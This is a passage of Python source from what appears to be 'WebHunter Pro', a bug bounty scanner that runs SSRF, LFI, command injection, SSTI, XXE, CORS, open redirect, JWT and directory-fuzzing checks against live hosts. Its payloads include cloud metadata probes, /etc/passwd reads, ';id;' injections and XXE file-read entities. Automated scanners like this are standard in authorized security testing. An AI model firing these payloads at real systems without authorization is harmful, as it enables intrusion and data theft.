        if not xstrike: return
        self.log.info(f"{C.YELLOW}[XSS]{C.RESET} XSStrike on {len(urls)} URLs...")
        for url in urls:
            out = run_cmd(f"{xstrike} -u \"{url}\" --crawl -l 2 2>/dev/null", self.log, timeout=60)
            if out and any(k in out.lower() for k in ['vulnerable', 'xss', 'payload']):
                self.log.vuln("XSS (XSStrike)", url, severity="high")
                self.results.add_vuln("XSS", url, "high", "XSStrike confirmed", tool="xsstrike")

    # ── SSRF ─────────────────────────────────────────────────────────────────
    def _run_ssrf(self, urls):
        if not urls:
            if not any('ssrf' in t for t in self.vuln_types):
                return
        self.log.info(f"{C.MAGENTA}[SSRF]{C.RESET} Testing {len(urls)} candidates...")

        # SSRFmap
        ssrfmap = _get_tool_path('ssrfmap')
        if ssrfmap and urls:
            for url in urls[:3]:
                out = run_cmd(f"{ssrfmap} -r {url} -p url 2>/dev/null", self.log, timeout=60)
                if out and 'vulnerable' in out.lower():
                    self.log.vuln("SSRF", url, "SSRFmap confirmed", severity="critical")
                    self.results.add_vuln("SSRF", url, "critical", "SSRFmap confirmed", tool="ssrfmap")
                    self.results.ssrf_findings.append(url)
        else:
            # Custom SSRF check with Burp Collaborator-like payloads
            self._custom_ssrf_check(urls)

    def _custom_ssrf_check(self, urls):
        """Basic SSRF detection using internal IP payloads"""
        ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',       # AWS metadata
            'http://169.254.169.254/metadata/v1/',             # DigitalOcean
            'http://metadata.google.internal/',                # GCP
            'http://192.168.1.1/',                             # Internal LAN
            'http://localhost:80/',                            # Localhost
            'http://0.0.0.0:80/',                              # Zero address
            'dict://127.0.0.1:6379/info',                     # Redis
        ]
        self.log.info("Custom SSRF probe (internal IPs)...")
        found = []
        for url in urls[:10]:
            # find the ssrf-like param
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param, _ in params.items():
                if any(k in param.lower() for k in ['url','uri','path','dest','redirect','src','load','fetch']):
                    for payload in ssrf_payloads[:3]:
                        new_params = dict(params)
                        new_params[param] = [payload]
                        new_query = urllib.parse.urlencode(new_params, doseq=True)
                        test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                        try:
                            req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                            resp = urllib.request.urlopen(req, timeout=8)
                            body = resp.read(512).decode('utf-8', errors='ignore')
                            if any(k in body.lower() for k in ['ami-id', 'instance-id', 'metadata', 'hostname']):
                                self.log.vuln("SSRF (Confirmed)", test_url, f"Internal data leaked: {body[:80]}", severity="critical")
                                self.results.add_vuln("SSRF", test_url, "critical", body[:80], tool="custom")
                                self.results.ssrf_findings.append(test_url)
                                found.append(test_url)
                        except: pass
        if not found:
            self.log.info("No SSRF confirmed via internal IP probes (use Burp Collaborator for OOB)")

    # ── LFI ──────────────────────────────────────────────────────────────────
    def _run_lfi(self, urls):
        if not urls: return
        self.log.info(f"{C.ORANGE}[LFI]{C.RESET} Testing {len(urls)} candidates...")

        # LFISuite
        lfisuite = _get_tool_path('lfisuite') or _get_tool_path('lfisuite')
        if lfisuite and urls:
            for url in urls[:3]:
                out = run_cmd(f"{lfisuite} --url \"{url}\" --auto 2>/dev/null", self.log, timeout=60)
                if out and any(k in out.lower() for k in ['vulnerable', 'root:', 'etc/passwd']):
                    self.log.vuln("LFI", url, severity="critical")
                    self.results.add_vuln("LFI", url, "critical", "LFISuite confirmed", tool="lfisuite")
                    self.results.lfi_findings.append(url)
        else:
            self._custom_lfi_check(urls)

    def _custom_lfi_check(self, urls):
        lfi_payloads = [
            '../../../../etc/passwd', '../../../etc/passwd', '../../etc/passwd',
            '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%2f..%2f..%2fetc%2fpasswd', '/etc/passwd', '/proc/self/environ',
            '....\\....\\....\\windows\\win.ini', '..\\..\\..\\windows\\win.ini',
        ]
        lfi_markers = ['root:x:', 'daemon:', 'nobody:', '[extensions]', 'for 16-bit', 'MAPI']

        for url in urls[:8]:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param in params:
                for payload in lfi_payloads[:5]:
                    new_params = dict(params)
                    new_params[param] = [payload]
                    new_query = urllib.parse.urlencode(new_params, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                    try:
                        req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                        resp = urllib.request.urlopen(req, timeout=8)
                        body = resp.read(1024).decode('utf-8', errors='ignore')
                        if any(m in body for m in lfi_markers):
                            self.log.vuln("Local File Inclusion (LFI)", test_url,
                                         f"Payload: {payload}", severity="critical")
                            self.results.add_vuln("LFI", test_url, "critical",
                                                  f"Payload: {payload}", tool="custom")
                            self.results.lfi_findings.append(test_url)
                            with open(f"{self.output_dir}/lfi_confirmed.txt", 'a') as f:
                                f.write(f"[+] {test_url}\nPayload: {payload}\nResponse: {body[:200]}\n\n")
                            break
                    except: pass

    # ── Command Injection ─────────────────────────────────────────────────────
    def _run_cmdi(self, urls):
        if not urls: return
        self.log.info(f"{C.RED}[CMDi]{C.RESET} Testing {len(urls)} candidates...")

        # commix
        commix = _get_tool_path('commix')
        if commix and urls:
            for url in urls[:3]:
                out = run_cmd(f"{commix} --url \"{url}\" --batch --level=2 2>/dev/null",
                              self.log, timeout=90)
                if out and any(k in out.lower() for k in ['vulnerable', 'command injection', 'backdoor']):
                    self.log.vuln("Command Injection", url, "commix confirmed", severity="critical")
                    self.results.add_vuln("Command Injection", url, "critical",
                                         "commix confirmed", tool="commix")
                    self.results.cmdi_findings.append(url)
        else:
            self._custom_cmdi_check(urls)

    def _custom_cmdi_check(self, urls):
        payloads = [
            (';id;', ['uid=', 'gid=']),
            ('|id|', ['uid=', 'gid=']),
            ('`id`', ['uid=', 'gid=']),
            (';sleep 5;', []),  # time-based
            ('|ping -c 1 127.0.0.1|', ['ttl=', 'bytes from']),
            ('$(id)', ['uid=', 'gid=']),
        ]
        for url in urls[:5]:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param in params:
                for payload, markers in payloads[:4]:
                    new_params = dict(params)
                    new_params[param] = [payload]
                    test_url = urllib.parse.urlunparse(
                        parsed._replace(query=urllib.parse.urlencode(new_params, doseq=True)))
                    try:
                        start = time.time()
                        req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                        resp = urllib.request.urlopen(req, timeout=10)
                        elapsed = time.time() - start
                        body = resp.read(512).decode('utf-8', errors='ignore')
                        if markers and any(m in body for m in markers):
                            self.log.vuln("Command Injection", test_url, f"Payload: {payload}", severity="critical")
                            self.results.add_vuln("Command Injection", test_url, "critical",
                                                  f"Payload: {payload}", tool="custom")
                            self.results.cmdi_findings.append(test_url)
                        elif not markers and elapsed >= 4.5:
                            self.log.vuln("Command Injection (Time-Based)", test_url,
                                         f"Response delayed {elapsed:.1f}s", severity="critical")
                            self.results.add_vuln("Command Injection (Time-Based)", test_url, "critical",
                                                  f"Delay: {elapsed:.1f}s", tool="custom")
                    except: pass

    # ── SSTI ──────────────────────────────────────────────────────────────────
    def _run_ssti(self, urls):
        if not urls: return
        self.log.info(f"{C.PINK}[SSTI]{C.RESET} Testing {len(urls)} candidates...")

        # tplmap
        tplmap = _get_tool_path('tplmap')
        if tplmap and urls:
            for url in urls[:3]:
                out = run_cmd(f"{tplmap} -u \"{url}\" 2>/dev/null", self.log, timeout=90)
                if out and any(k in out.lower() for k in ['vulnerable', 'engine', 'code execution']):
                    self.log.vuln("Server-Side Template Injection (SSTI)", url,
                                 "tplmap confirmed", severity="critical")
                    self.results.add_vuln("SSTI", url, "critical", "tplmap confirmed", tool="tplmap")
                    self.results.ssti_findings.append(url)
        else:
            self._custom_ssti_check(urls)

    def _custom_ssti_check(self, urls):
        """Test for SSTI with polyglot payload"""
        # {{7*7}} should return 49 in Jinja2/Twig
        # ${7*7} for Freemarker/Velocity
        payloads = {
            '{{7*7}}':       '49',
            '${7*7}':        '49',
            '#{7*7}':        '49',
            '<%= 7*7 %>':    '49',
            '{{7*\'7\'}}':   '7777777',
            '*{7*7}':        '49',
        }
        for url in urls[:5]:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param in params:
                for payload, expected in payloads.items():
                    new_params = dict(params)
                    new_params[param] = [payload]
                    test_url = urllib.parse.urlunparse(
                        parsed._replace(query=urllib.parse.urlencode(new_params, doseq=True)))
                    try:
                        req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                        resp = urllib.request.urlopen(req, timeout=8)
                        body = resp.read(2048).decode('utf-8', errors='ignore')
                        if expected in body:
                            self.log.vuln("SSTI", test_url,
                                         f"Payload '{payload}' returned '{expected}'", severity="critical")
                            self.results.add_vuln("SSTI", test_url, "critical",
                                                  f"Payload: {payload}", tool="custom")
                            self.results.ssti_findings.append(test_url)
                            break
                    except: pass

    # ── CORS ─────────────────────────────────────────────────────────────────
    def _run_cors_check(self):
        self.log.info(f"{C.BLUE}[CORS]{C.RESET} Checking CORS misconfigurations...")

        # Corsy
        corsy = _get_tool_path('corsy')
        if corsy and self.results.alive_hosts:
            hosts_file = f"{self.output_dir}/clean_hosts.txt"
            if os.path.exists(hosts_file):
                out = run_cmd(f"{corsy} -i {hosts_file} -t 10 2>/dev/null", self.log, timeout=120)
                if out:
                    for line in out.splitlines():
                        if 'vulnerable' in line.lower() or 'misconfigured' in line.lower():
                            self.log.vuln("CORS Misconfiguration", line, severity="medium")
                            self.results.add_vuln("CORS", line, "medium", tool="corsy")
                            self.results.cors_findings.append(line)
        else:
            self._custom_cors_check()

    def _custom_cors_check(self):
        """Custom CORS misconfiguration check"""
        evil_origins = [
            'https://evil.com',
            'https://attacker.com',
            'null',
        ]
        for host in (self.results.alive_hosts or [])[:10]:
            url = host.split()[0]
            if not url.startswith('http'):
                url = f'https://{url}'
            for origin in evil_origins:
                try:
                    req = urllib.request.Request(url, headers={
                        'Origin': origin,
                        'User-Agent': 'Mozilla/5.0'
                    })
                    resp = urllib.request.urlopen(req, timeout=8)
                    acao = resp.headers.get('Access-Control-Allow-Origin', '')
                    acac = resp.headers.get('Access-Control-Allow-Credentials', '')
                    if acao == origin or acao == '*':
                        severity = "high" if acac.lower() == 'true' else "medium"
                        detail = f"ACAO: {acao} | ACAC: {acac}"
                        self.log.vuln("CORS Misconfiguration", url, detail, severity=severity)
                        self.results.add_vuln("CORS", url, severity, detail, tool="custom")
                        self.results.cors_findings.append(url)
                        break
                except: pass

    # ── XXE ──────────────────────────────────────────────────────────────────
    def _run_xxe_check(self):
        if not any('xxe' in t for t in self.vuln_types):
            self.log.info(f"{C.CYAN}[XXE]{C.RESET} No XXE hints from nuclei. Running basic check...")
        else:
            self.log.info(f"{C.CYAN}[XXE]{C.RESET} XXE detected by nuclei — testing...")

        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><data>&xxe;</data></root>"""

        xxe_found = []
        for host in (self.results.alive_hosts or [])[:5]:
            url = host.split()[0]
            if not url.startswith('http'): url = f'https://{url}'
            try:
                data = xxe_payload.encode()
                req = urllib.request.Request(url, data=data, headers={
                    'Content-Type': 'application/xml',
                    'User-Agent': 'Mozilla/5.0'
                })
                resp = urllib.request.urlopen(req, timeout=10)
                body = resp.read(1024).decode('utf-8', errors='ignore')
                if 'root:x:' in body or 'daemon:' in body:
                    self.log.vuln("XXE (File Read)", url, "Returned /etc/passwd", severity="critical")
                    self.results.add_vuln("XXE", url, "critical", "File read confirmed", tool="custom")
                    xxe_found.append(url)
            except: pass

        if not xxe_found:
            self.log.info("No XXE confirmed — OOB testing recommended (use Burp Collaborator)")

    # ── IDOR ─────────────────────────────────────────────────────────────────
    def _run_idor_check(self):
        self.log.info(f"{C.GREEN}[IDOR]{C.RESET} Checking for IDOR patterns...")
        idor_params = ['id', 'user_id', 'uid', 'account', 'account_id', 'profile',
                       'profile_id', 'order', 'order_id', 'invoice', 'doc_id', 'file_id']
        idor_candidates = []
        for url in self.results.endpoints:
            for param in idor_params:
                if re.search(rf'[?&]{re.escape(param)}=\d+', url, re.IGNORECASE):
                    idor_candidates.append((url, param))
                    break

        if not idor_candidates:
            self.log.info("No numeric IDOR candidates found.")
            return

        self.log.info(f"Found {len(idor_candidates)} potential IDOR candidates — flagging for manual review")
        idor_out = f"{self.output_dir}/idor_candidates.txt"
        with open(idor_out, 'w') as f:
            for url, param in idor_candidates[:20]:
                f.write(f"[IDOR Candidate] param={param} → {url}\n")
                # Flag as potential (needs manual verification)
                self.results.add_vuln("IDOR (Potential)", url, "medium",
                                      f"Numeric param '{param}' — manual testing needed", tool="custom")
        self.log.warn(f"IDOR candidates saved to {idor_out} — manual verification required")

    # ── JWT ───────────────────────────────────────────────────────────────────
    def _run_jwt_check(self):
        jwt_tool = _get_tool_path('jwt_tool')

        # Look for JWTs in secrets found
        jwt_tokens = [s for s in self.results.secrets_found
                      if s.get('type') == 'JWT Token']

        if not jwt_tokens:
            # Check cookies/responses for JWTs
            self.log.info(f"{C.YELLOW}[JWT]{C.RESET} Scanning responses for JWT tokens...")
            for host in (self.results.alive_hosts or [])[:5]:
                url = host.split()[0]
                if not url.startswith('http'): url = f'https://{url}'
                try:
                    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                    resp = urllib.request.urlopen(req, timeout=8)
                    cookie_header = resp.headers.get('Set-Cookie', '')
                    body = resp.read(2048).decode('utf-8', errors='ignore')
                    combined = cookie_header + body
                    jwt_matches = re.findall(r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', combined)
                    if jwt_matches:
                        token = jwt_matches[0]
                        self.log.info(f"JWT found at {url}: {token[:30]}...")
                        if jwt_tool:
                            self.log.info("Running jwt_tool checks (alg:none, weak secrets)...")
                            out = run_cmd(f"{jwt_tool} -t \"{token}\" -M at 2>/dev/null",
                                         self.log, timeout=60)
                            if out and any(k in out.lower() for k in ['vulnerable', 'cracked', 'none']):
                                self.log.vuln("JWT Vulnerability", url, out[:100], severity="high")
                                self.results.add_vuln("JWT Vulnerability", url, "high",
                                                      out[:100], tool="jwt_tool")
                                self.results.jwt_findings.append({'url': url, 'token': token[:50]})
                        else:
                            # Manual alg:none check
                            self._manual_jwt_check(token, url)
                except: pass

    def _manual_jwt_check(self, token, url):
        import base64
        try:
            parts = token.split('.')
            if len(parts) != 3: return
            header_data = base64.b64decode(parts[0] + '==').decode('utf-8', errors='ignore')
            header = json.loads(header_data)
            alg = header.get('alg', '').lower()
            if alg == 'none' or alg == '':
                self.log.vuln("JWT: alg:none Attack", url, "Algorithm set to none!", severity="critical")
                self.results.add_vuln("JWT alg:none", url, "critical",
                                      "JWT uses none algorithm", tool="custom")
                self.results.jwt_findings.append({'url': url, 'issue': 'alg:none'})
            elif alg == 'hs256':
                self.log.info(f"JWT uses HS256 at {url} — consider offline brute-force with hashcat")
        except: pass

    # ── Open Redirect ─────────────────────────────────────────────────────────
    def _run_open_redirect(self, urls):
        self.log.info(f"{C.CYAN}[Redirect]{C.RESET} Testing open redirect...")
        redirect_params = ['redirect', 'url', 'next', 'return', 'returnUrl', 'return_url',
                           'redirect_uri', 'callback', 'goto', 'target', 'to', 'link', 'out']
        payloads = ['//evil.com', '//evil.com/%2F..', 'https://evil.com',
                    '///evil.com', '/\\evil.com', '//evil%2ecom']
        found = []
        for url in urls:
            for param in redirect_params:
                if re.search(rf'[?&]{re.escape(param)}=', url, re.IGNORECASE):
                    for payload in payloads[:3]:
                        test_url = re.sub(rf'({re.escape(param)}=)[^&]*',
                                          rf'\g<1>{urllib.parse.quote(payload)}', url, flags=re.IGNORECASE)
                        try:
                            req = urllib.request.Request(test_url, headers={'User-Agent': 'Mozilla/5.0'})
                            resp = urllib.request.urlopen(req, timeout=6)
                            if 'evil.com' in resp.geturl():
                                self.log.vuln("Open Redirect", test_url,
                                             f"Redirects to {resp.geturl()}", severity="medium")
                                self.results.add_vuln("Open Redirect", test_url, "medium",
                                                      f"Redirects to {resp.geturl()}", tool="custom")
                                self.results.open_redirect_findings.append(test_url)
                                found.append(test_url)
                        except: pass
        if not found:
            self.log.info("No open redirects confirmed.")

    # ── Nikto ─────────────────────────────────────────────────────────────────
    def _run_nikto(self):
        if 'nikto' not in self.available: return
        self.log.info(f"{C.CYAN}[Nikto]{C.RESET} Running nikto web scanner...")
        targets = (self.results.alive_hosts or [])[:3]
        for host in targets:
            url = host.split()[0]
            if not url.startswith('http'): url = f'https://{url}'
            out_file = f"{self.output_dir}/nikto_{abs(hash(url)) % 9999}.txt"
            cmd = f"nikto -h {url} -output {out_file} -Format txt -nointeractive 2>/dev/null"
            run_cmd(cmd, self.log, timeout=180)
            if os.path.exists(out_file):
                with open(out_file) as f:
                    content = f.read()
                vuln_lines = [l for l in content.splitlines()
                              if '+ ' in l and not l.startswith('+ Target')]
                for line in vuln_lines[:10]:
                    self.log.vuln("Nikto Finding", url, line.strip(), severity="medium")

# ─── Phase 7: Directory & File Fuzzing ────────────────────────────────────────
class DirectoryFuzzer:
    def __init__(self, alive_hosts, output_dir, log, results, available):
        self.alive_hosts = alive_hosts
        self.output_dir = output_dir
        self.log = log
        self.results = results
        self.available = available

    def run(self):
        self.log.phase("PHASE 7: DIRECTORY & FILE FUZZING")
        targets = (self.alive_hosts or [])[:5]

        if 'ffuf' in self.available:
            self._run_ffuf(targets)
        elif 'gobuster' in self.available:
            self._run_gobuster(targets)
        elif 'feroxbuster' in self.available:
            self._run_feroxbuster(targets)
        else:
            self.log.warn("No fuzzer found (ffuf/gobuster/feroxbuster). Skipping.")

    def _run_ffuf(self, targets):
        # Common wordlists
        wordlists = [
            '/usr/share/wordlists/dirb/common.txt',
            '/usr/share/seclists/Discovery/Web-Content/common.txt',
            '/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',
            f'{Path.home()}/wordlists/common.txt',
        ]
        wordlist = next((w for w in wordlists if os.path.exists(w)), None)
        if not wordlist:
            self.log.warn("No wordlist found for ffuf. Skipping directory fuzzing.")
            return

        for host in targets:
            url = host.split()[0]
            if not url.startswith('http'): url = f'https://{url}'
            out_file = f"{self.output_dir}/ffuf_{abs(hash(url)) % 9999}.json"
            cmd = (f"ffuf -u {url}/FUZZ -w {wordlist} "
                   f"-mc 200,201,204,301,302,307,401,403 "
                   f"-t 50 -timeout 10 -of json -o {out_file} -s")
            self.log.info(f"ffuf on {url}...")
            run_cmd(cmd, self.log, timeout=120)

            if os.path.exists(out_file):
                try:
                    with open(out_file) as f:
                        data = json.load(f)
                    found = data.get('results', [])
                    if found:
                        self.log.success(f"ffuf → {len(found)} paths found on {url}")
                        interesting = [r for r in found
                                       if r.get('status') in [200, 201, 401] or
                                       any(k in r.get('url','').lower()
                                           for k in ['admin','backup','config','db','secret','api','test'])]
                        for r in interesting[:10]:
                            self.log.vuln("Exposed Path", r.get('url',''), 
                                         f"Status: {r.get('status')} Size: {r.get('length')}",
                                         severity="medium")
                            self.results.add_vuln("Exposed Directory/File", r.get('url',''),
                                                  "medium", f"HTTP {r.get('status')}", tool="ffuf")
                except: pass

    def _run_gobuster(self, targets):
        wordlists = ['/usr/share/wordlists/dirb/common.txt',
                     '/usr/share/seclists/Discovery/Web-Content/common.txt']
        wordlist = next((w for w in wordlists if os.path.exists(w)), None)
        if not wordlist: return
        for host in targets:
            url = host.split()[0]
            if not url.startswith('http'): url = f'https://{url}'
            self.log.info(f"gobuster on {url}...")
            out = run_cmd(f"gobuster dir -u {url} -w {wordlist} -t 30 -q --no-error", self.log, timeout=120)
            if out:
                for line in out.splitlines():
                    if line.strip():
                        self.log.info(f"  {line}")

    def _run_feroxbuster(self, targets):
        for host in targets[:3]:
            url = host.split()[0]
            if not url.startswith('http'): url = f'https://{url}'
            out_file = f"{self.output_dir}/ferox_{abs(hash(url)) % 9999}.json"
            self.log.info(f"feroxbuster on {url}...")
            run_cmd(f"feroxbuster -u {url} -q --json -o {out_file} --timeout 10", self.log, timeout=120)

# ─── Phase 8: Report Generator ────────────────────────────────────────────────
class ReportGenerator:
    def __init__(self, results, output_dir, log):
        self.results = results
        self.output_dir = output_dir
        self.log = log

    def generate(self):
        self.log.phase("PHASE 8: REPORT GENERATION")
        self._generate_json()
        self._generate_markdown()
        self._generate_html()
        self._print_summary()

    def _generate_json(self):
        with open(f"{self.output_dir}/report.json", 'w') as f:
            json.dump(self.results.summary(), f, indent=2)
        self.log.success(f"JSON report → {self.output_dir}/report.json")

    def _generate_markdown(self):
        r = self.results
        sev = lambda s: sum(1 for v in r.vulnerabilities if v['severity'] == s)
        md = f"""# WebHunter Pro — Bug Bounty Report

**Target:** `{r.domain}`  
**Scan Date:** {r.start_time.strftime('%Y-%m-%d %H:%M:%S')}  
**Duration:** {str(datetime.now() - r.start_time).split('.')[0]}  

---

## Executive Summary

| Metric | Count |
|--------|-------|
| Subdomains Found | {len(r.subdomains)} |
| Alive Hosts | {len(r.alive_hosts)} |
| Crawled URLs | {len(r.crawled_urls)} |
| Endpoints w/ Params | {len(r.endpoints)} |
| JS Files | {len(r.js_files)} |
| Secrets Found | {len(r.secrets_found)} |
| **Total Vulnerabilities** | **{len(r.vulnerabilities)}** |

## Vulnerability Breakdown

| Severity | Count |
|----------|-------|
| 🔴 Critical | {sev('critical')} |
| 🟠 High | {sev('high')} |
| 🟡 Medium | {sev('medium')} |
| 🔵 Low | {sev('low')} |

---

## Findings

"""
        vuln_types_found = {}
        for v in r.vulnerabilities:
            vuln_types_found.setdefault(v['type'], []).append(v)

        for i, (vtype, vulns) in enumerate(vuln_types_found.items(), 1):
            sev_emoji = {'critical': '🔴', 'high': '🟠', 'medium': '🟡', 'low': '🔵'}.get(vulns[0]['severity'], '⚪')
            md += f"### {i}. {sev_emoji} {vtype} ({len(vulns)} instance{'s' if len(vulns) > 1 else ''})\n\n"
            for v in vulns[:5]:
                md += f"- `{v['url'][:100]}` — **{v.get('tool','?')}** — {v.get('detail','')[:80]}\n"
            if len(vulns) > 5:
                md += f"- *...and {len(vulns)-5} more*\n"
            md += "\n---\n\n"

        if r.secrets_found:
            md += "## Secrets & Sensitive Data\n\n"
            for s in r.secrets_found[:10]:
                md += f"- **{s.get('type','?')}** in `{s.get('url', s.get('file','?'))[:80]}`\n"
            md += "\n---\n\n"

        md += f"""## Subdomains ({len(r.subdomains)} found)

```
{chr(10).join(sorted(r.subdomains)[:50])}
{"... and more" if len(r.subdomains) > 50 else ""}
```

---

## Disclaimer

This report was generated by WebHunter Pro for authorized penetration testing purposes only.
All testing was performed with explicit written permission from the target organization.
"""
        with open(f"{self.output_dir}/report.md", 'w') as f:
            f.write(md)
        self.log.success(f"Markdown report → {self.output_dir}/report.md")

    def _generate_html(self):
        r = self.results
        sev = lambda s: sum(1 for v in r.vulnerabilities if v['severity'] == s)

        vuln_rows = ""
        for v in r.vulnerabilities:
            sev_color = {'critical': '#ff3333', 'high': '#ff8800', 'medium': '#ffcc00', 'low': '#44aaff'}.get(v['severity'], '#888')
            vuln_rows += f"""<tr>
                <td><span class="badge" style="background:{sev_color};color:#000">{v['severity'].upper()}</span></td>
                <td><strong>{v['type']}</strong></td>
                <td class="mono">{v['url'][:90]}{'...' if len(v['url'])>90 else ''}</td>
                <td><span class="tool-badge">{v.get('tool','?')}</span></td>
                <td class="dim">{v.get('detail','')[:60]}</td>
            </tr>"""

        secret_rows = ""
        for s in r.secrets_found:
            secret_rows += f"""<tr>
                <td><strong>{s.get('type','?')}</strong></td>
                <td class="mono">{s.get('url', s.get('file','?'))[:80]}</td>
                <td class="dim mono">{str(s.get('match',''))[:50]}</td>
            </tr>"""

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WebHunter Pro — {r.domain}</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&display=swap');
  :root {{
    --bg:#080d14; --panel:#0c1420; --panel2:#0f1825; --border:#1a2a40;
    --text:#b8cce0; --dim:#3d5570; --accent:#00d4ff; --accent2:#00ff88;
    --red:#ff3333; --orange:#ff8800; --yellow:#ffcc00; --green:#00ff88;
    --pink:#ff69b4; --purple:#9d4edd;
  }}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--bg);color:var(--text);font-family:'Rajdhani',sans-serif;font-size:15px;line-height:1.6}}
  .scanline{{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,212,255,0.008) 2px,rgba(0,212,255,0.008) 4px);pointer-events:none;z-index:999}}
  header{{background:linear-gradient(135deg,#080d14,#0d1829,#080d14);border-bottom:2px solid var(--accent);padding:35px 50px;position:relative;overflow:hidden}}
  header::before{{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(ellipse at 60% 40%,rgba(0,212,255,0.06),transparent 60%);animation:pulse 5s ease-in-out infinite}}
  @keyframes pulse{{0%,100%{{opacity:.4}}50%{{opacity:1}}}}
  .logo{{font-family:'Share Tech Mono',monospace;font-size:26px;color:var(--accent);letter-spacing:4px;text-shadow:0 0 30px rgba(0,212,255,.6)}}
  .tagline{{color:var(--dim);font-size:12px;letter-spacing:3px;margin-top:4px;text-transform:uppercase}}
  .target{{display:inline-block;background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.4);padding:8px 20px;border-radius:4px;font-family:'Share Tech Mono',monospace;color:var(--accent);font-size:18px;margin-top:15px}}
  .meta{{color:var(--dim);font-family:'Share Tech Mono',monospace;font-size:12px;margin-top:10px}}
  .container{{max-width:1300px;margin:0 auto;padding:30px 50px}}
  .stats{{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:14px;margin:30px 0}}
  .stat{{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:18px;text-align:center;transition:all .3s;position:relative;overflow:hidden}}
  .stat:hover{{border-color:var(--accent);transform:translateY(-2px)}}
  .stat::after{{content:'';position:absolute;bottom:0;left:0;right:0;height:2px}}
  .stat.crit::after{{background:var(--red)}} .stat.high::after{{background:var(--orange)}}
  .stat.med::after{{background:var(--yellow)}} .stat.info::after{{background:var(--accent)}}
  .stat.ok::after{{background:var(--green)}}
  .num{{font-family:'Share Tech Mono',monospace;font-size:32px;font-weight:bold;color:var(--accent)}}
  .num.red{{color:var(--red)}} .num.org{{color:var(--orange)}} .num.yel{{color:var(--yellow)}} .num.grn{{color:var(--green)}}
  .lbl{{color:var(--dim);font-size:11px;letter-spacing:1.5px;text-transform:uppercase;margin-top:4px}}
  .section{{margin:30px 0}}
  .sec-title{{font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--accent);letter-spacing:2px;text-transform:uppercase;border-left:3px solid var(--accent);padding-left:14px;margin-bottom:18px;display:flex;align-items:center;gap:10px}}
  .count-badge{{background:rgba(0,212,255,.1);border:1px solid rgba(0,212,255,.3);padding:2px 10px;border-radius:10px;font-size:11px}}
  table{{width:100%;border-collapse:collapse}}
  thead th{{background:rgba(0,212,255,.07);color:var(--accent);font-size:11px;letter-spacing:1px;text-transform:uppercase;padding:12px 14px;text-align:left;border-bottom:1px solid var(--border)}}
  tbody tr{{border-bottom:1px solid rgba(26,42,64,.5);transition:background .2s}}
  tbody tr:hover{{background:rgba(0,212,255,.03)}}
  tbody td{{padding:11px 14px;vertical-align:top}}
  .badge{{display:inline-block;padding:3px 10px;border-radius:3px;font-size:10px;font-weight:700;letter-spacing:1.5px}}
  .tool-badge{{background:rgba(157,78,221,.15);border:1px solid rgba(157,78,221,.4);color:#c77dff;padding:2px 8px;border-radius:3px;font-size:10px;font-family:'Share Tech Mono',monospace}}
  .mono{{font-family:'Share Tech Mono',monospace;font-size:12px;color:#7ab8e8}}
  .dim{{color:var(--dim);font-size:13px}}
  .no-data{{text-align:center;padding:40px;color:var(--green);font-family:'Share Tech Mono',monospace}}
  .vuln-type-group{{margin-bottom:4px}}
  footer{{border-top:1px solid var(--border);padding:20px 50px;text-align:center;color:var(--dim);font-family:'Share Tech Mono',monospace;font-size:11px;letter-spacing:1px}}
  .glow{{text-shadow:0 0 10px currentColor}}
  @media(max-width:768px){{.container{{padding:20px}}.stats{{grid-template-columns:repeat(2,1fr)}}header{{padding:20px}}}}
</style>
</head>
<body>
<div class="scanline"></div>
<header>
  <div class="logo glow">[ WEBHUNTER PRO ]</div>
  <div class="tagline">Full Arsenal Bug Bounty Automation Framework v2.0</div>
  <div class="target">🎯 {r.domain}</div>
  <div class="meta">Scan: {r.start_time.strftime('%Y-%m-%d %H:%M:%S')} &nbsp;|&nbsp; Duration: {str(datetime.now() - r.start_time).split('.')[0]} &nbsp;|&nbsp; Modules: SQLi · XSS · SSRF · LFI · CMDi · SSTI · CORS · XXE · IDOR · JWT · Secrets</div>
</header>

<div class="container">
  <div class="stats">
    <div class="stat info"><div class="num">{len(r.subdomains)}</div><div class="lbl">Subdomains</div></div>
    <div class="stat info"><div class="num">{len(r.alive_hosts)}</div><div class="lbl">Alive Hosts</div></div>
    <div class="stat info"><div class="num">{len(r.crawled_urls)}</div><div class="lbl">URLs Found</div></div>
    <div class="stat info"><div class="num">{len(r.endpoints)}</div><div class="lbl">Endpoints</div></div>
    <div class="stat ok"><div class="num grn">{len(r.js_files)}</div><div class="lbl">JS Files</div></div>
    <div class="stat ok"><div class="num grn">{len(r.secrets_found)}</div><div class="lbl">Secrets</div></div>
